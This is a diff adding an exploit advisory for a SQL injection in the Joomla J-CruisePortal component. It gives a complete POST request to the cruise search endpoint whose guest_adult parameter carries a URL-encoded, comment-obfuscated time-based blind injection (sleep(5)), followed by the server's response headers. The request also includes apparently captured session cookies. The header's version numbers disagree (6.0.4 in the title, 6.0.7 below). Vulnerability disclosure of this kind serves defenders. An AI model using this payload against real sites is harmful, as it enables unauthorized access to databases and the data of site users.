@@ -1,0 +1,42 @@
+# Exploit Title: Joomla! Component J-CruisePortal 6.0.4 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-23
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://cmsjunkie.com/
+# Software Link: https://www.cmsjunkie.com/joomla-cruise-reservation-portal
+# Version: 6.0.7
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/cruises
+# 
+
+POST /[PATH]/cruises/cruises HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 518
+Cookie: __cfduid=d35dbe4de0d461bf69a9165df0f9691951548240991; 79a1b3ae870a3fab009030106c9fb887=eeab77f1b87057d5ad12b61071048ad6; PHPSESSID=c1088ee33a3f4770dd333f9605b9e44f; 704a7cf3f453ec2db97de2f28ef169f8=fb9a121113ff0e6cc6da546a82f2452e; 398e9ff8e95a4e22822ceef0b6c44a4a=a94f101ca5d3b159ceea66309ea3a951; joomla_user_state=logged_in; 886feb4c8becc9e8152c352c36facdb9=0a4cabcc031321270d6811b7ab5222b0
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+controller=search&task=searchCruises&year_start=2019&month_start=01&day_start=23&year_end=2019&month_end=01&cruise_id=&day_end=24&rooms=1&guest_adult=2%20%20%2f%2a%21%31%31%31%31%31%61%6e%44%2a%2f%20%73%6c%65%65%70%28%35%29&guest_child=0&filterParams=&resetSearch=1&searchType=&searchId=&room-guests%5B%5D=2&room-guests-children%5B%5D=0&keyword=&jcruisereservation_datas=01%2F23%2F2019&jcruisereservation_datae=01%2F24%2F2019&jcruisereservation_rooms=1&jcruisereservation_guest_adult=2&jcruisereservation_guest_child=0: undefined
+HTTP/1.1 200 OK
+Date: Wed, 23 Jan 2019 16:42:13 GMT
+Content-Type: text/html; charset=utf-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+P3P: CP="NOI ADM DEV PSAi COM NAV OUR OTRo STP IND DEM"
+Expires: Wed, 17 Aug 2005 00:00:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Last-Modified: Wed, 23 Jan 2019 16:42:13 GMT
+Alt-Svc: h2=":443"; ma=60
+Server: cloudflare
+CF-RAY: 49dbb4e4622dc7e8-DFW
